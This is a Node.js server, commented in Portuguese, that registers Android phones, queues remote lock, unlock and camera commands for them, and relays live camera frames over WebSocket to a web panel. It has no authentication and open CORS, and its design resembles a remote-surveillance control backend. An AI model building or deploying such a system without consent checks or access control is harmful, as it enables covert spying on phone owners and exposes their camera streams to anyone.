const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const app = express();
const PORT = process.env.PORT || 3000;
const cors = require('cors');
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.options('*', cors());
app.use(express.json({ limit: '50mb' })); // Aumentar limite para imagens
app.use(express.static('public'));

// Banco em memória
const dispositivos = [];
const comandosPendentes = {};
const streamsAtivos = new Map(); // deviceId -> websocket
const viewersAtivos = new Map(); // viewerId -> websocket

// Servidor HTTP e WebSocket
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ========== WEBSOCKET PARA STREAMING ==========
wss.on('connection', (ws, req) => {
    const url = req.url;
    
    // Streaming do celular: /stream/DEVICE_ID
    if (url.startsWith('/stream/')) {
        const deviceId = url.split('/')[2];
        console.log(`📷 Celular conectado para streaming: ${deviceId}`);
        
        streamsAtivos.set(deviceId, ws);
        
        ws.on('message', (frame) => {
            // Frame recebido do celular (já em base64)
            // Encaminha para todos os viewers deste dispositivo
            if (viewersAtivos.has(deviceId)) {
                const viewers = viewersAtivos.get(deviceId);
                viewers.forEach(viewerWs => {
                    if (viewerWs.readyState === WebSocket.OPEN) {
                        viewerWs.send(JSON.stringify({
                            type: 'frame',
                            deviceId: deviceId,
                            frame: frame.toString(),
                            timestamp: Date.now()
                        }));
                    }
                });
            }
        });
        
        ws.on('close', () => {
            console.log(`📷 Streaming encerrado: ${deviceId}`);
            streamsAtivos.delete(deviceId);
            
            // Notifica viewers
            if (viewersAtivos.has(deviceId)) {
                const viewers = viewersAtivos.get(deviceId);
                viewers.forEach(viewerWs => {
                    if (viewerWs.readyState === WebSocket.OPEN) {
                        viewerWs.send(JSON.stringify({
                            type: 'stream_offline',
                            deviceId: deviceId
                        }));
                    }
                });
            }
        });
    }
    
    // Viewer do painel web: /view/DEVICE_ID
    else if (url.startsWith('/view/')) {
        const deviceId = url.split('/')[2];
        console.log(`👀 Viewer conectado para dispositivo: ${deviceId}`);
        
        if (!viewersAtivos.has(deviceId)) {
            viewersAtivos.set(deviceId, new Set());
        }
        viewersAtivos.get(deviceId).add(ws);
        
        // Informa se o stream está ativo
        if (streamsAtivos.has(deviceId)) {
            ws.send(JSON.stringify({
                type: 'stream_online',
                deviceId: deviceId
            }));
        }
        
        ws.on('close', () => {
            console.log(`👀 Viewer desconectado: ${deviceId}`);
            if (viewersAtivos.has(deviceId)) {
                viewersAtivos.get(deviceId).delete(ws);
                if (viewersAtivos.get(deviceId).size === 0) {
                    viewersAtivos.delete(deviceId);
                }
            }
        });
    }
});

// ========== ROTAS EXISTENTES ==========
app.post('/api/registrar', (req, res) => {
    const { nome, modelo, androidVersion } = req.body;
    const deviceId = Date.now().toString();
    
    const novoDispositivo = {
        id: deviceId,
        nome: nome || 'Dispositivo Android',
        modelo,
        androidVersion,
        status: 'online',
        ultimoContato: new Date().toISOString()
    };
    
    dispositivos.push(novoDispositivo);
    console.log('📱 Registrado:', deviceId);
    
    res.json({ success: true, deviceId });
});

app.get('/api/comandos/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const comandos = comandosPendentes[deviceId] || [];
    comandosPendentes[deviceId] = [];
    res.json({ comandos });
});

app.post('/api/bloquear/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    if (!comandosPendentes[deviceId]) comandosPendentes[deviceId] = [];
    comandosPendentes[deviceId].push({ tipo: 'BLOQUEAR', timestamp: Date.now() });
    console.log(`🔒 Bloqueio enviado para ${deviceId}`);
    res.json({ success: true });
});

app.post('/api/desbloquear/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    if (!comandosPendentes[deviceId]) comandosPendentes[deviceId] = [];
    comandosPendentes[deviceId].push({ tipo: 'DESBLOQUEAR', timestamp: Date.now() });
    console.log(`🔓 Desbloqueio enviado para ${deviceId}`);
    res.json({ success: true });
});

// ========== NOVAS ROTAS PARA CÂMERA ==========
// Iniciar streaming
app.post('/api/camera/start/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    console.log(`📷 Solicitação para iniciar câmera: ${deviceId}`);
    
    // Adiciona comando para o dispositivo iniciar câmera
    if (!comandosPendentes[deviceId]) comandosPendentes[deviceId] = [];
    comandosPendentes[deviceId].push({ 
        tipo: 'CAMERA_START', 
        timestamp: Date.now() 
    });
    
    res.json({ success: true, message: 'Comando para iniciar câmera enviado' });
});

// Parar streaming
app.post('/api/camera/stop/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    console.log(`📷 Solicitação para parar câmera: ${deviceId}`);
    
    if (!comandosPendentes[deviceId]) comandosPendentes[deviceId] = [];
    comandosPendentes[deviceId].push({ 
        tipo: 'CAMERA_STOP', 
        timestamp: Date.now() 
    });
    
    res.json({ success: true, message: 'Comando para parar câmera enviado' });
});

// Status da câmera
app.get('/api/camera/status/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const ativo = streamsAtivos.has(deviceId);
    res.json({ 
        deviceId, 
        streaming: ativo,
        viewers: viewersAtivos.has(deviceId) ? viewersAtivos.get(deviceId).size : 0
    });
});

app.get('/api/dispositivos', (req, res) => {
    const agora = new Date();
    dispositivos.forEach(d => {
        const diff = (agora - new Date(d.ultimoContato)) / 1000;
        d.status = diff < 60 ? 'online' : 'offline';
        d.streaming = streamsAtivos.has(d.id);
    });
    res.json(dispositivos);
});

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// Iniciar servidor
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    console.log(`📡 WebSocket disponível em ws://localhost:${PORT}`);
});